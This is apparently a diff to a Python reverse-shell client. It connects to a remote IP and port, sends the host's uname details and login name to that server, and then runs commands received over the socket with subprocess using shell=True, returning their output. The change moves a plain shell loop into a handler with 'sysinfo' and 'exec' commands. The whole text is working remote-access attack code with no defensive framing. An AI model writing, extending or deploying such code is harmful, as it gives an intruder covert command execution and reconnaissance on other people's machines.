@@ -33,30 +33,49 @@ def connect(ip,port):
 			print("[!] Unable to connect! Is server listening?")
 			sys.exit(1)
 
-		x_info = ""
-		for x in os.uname():
-			x_info += x + ","
-		x_info += os.getlogin()
-		x_info = x_info.encode('utf-8')
-		s.send(x_info)
-		shell(s)
+		sysinfo(s)
+		commandhandler(s)
 
-def shell(s):
 
+def sysinfo(s):
+	x_info = ""
+	for x in os.uname():
+		x_info += x + ","
+	x_info += os.getlogin()
+	x_info = x_info.encode('utf-8')
+	s.send(x_info)
+
+
+def exec(s):
+
+	com = s.recv(1024)
+	com = com.decode('utf-8')
+	if (' ' in com) == True:
+		err = '[!] One word commands supported only. (as of now...)'
+		err = err.encode('utf-8')
+		s.send(err)
+
+	p = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr = subprocess.STDOUT)
+	out = p.communicate()[0]
+	s.send(out)
+
+def commandhandler(s):
 	while 1:
 		command = s.recv(1024)
 		command = command.decode('utf-8')
 
-		if command != "exit":
-			sh = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-			out, err = sh.communicate()
-
-			result = out + err
-			s.send(result)
-		else:
+		if command == 'sysinfo':
+			sysinfo(s)
+		if command == 'exec':
+			exec(s)
+		if command == 'exit':
+			print("[!]Exit Signal Received.")
 			break
-	s.close()
+			s.close()
 
+		else:
+			result = '[!] Unknown Command!'
+			result = result.encode('utf-8')
+			s.send(result)
 if __name__ == "__main__":
 	main()
